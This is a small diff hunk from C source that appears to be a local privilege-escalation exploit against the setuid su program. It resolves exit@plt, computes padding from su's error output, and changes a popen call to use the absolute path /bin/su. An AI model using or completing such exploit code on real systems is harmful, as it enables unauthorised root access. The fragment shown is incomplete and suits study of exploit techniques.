@@ -150,7 +150,7 @@ int main(int argc, char **argv)
 			printf("[+] Resolved exit@plt to 0x%lx.\n", address);
 		}
 		printf("[+] Calculating su padding.\n");
-		FILE *command = popen("su this-user-does-not-exist 2>&1", "r");
+		FILE *command = popen("/bin/su this-user-does-not-exist 2>&1", "r");
 		char result[256];
 		result[0] = 0;
 		fgets(result, 256, command);
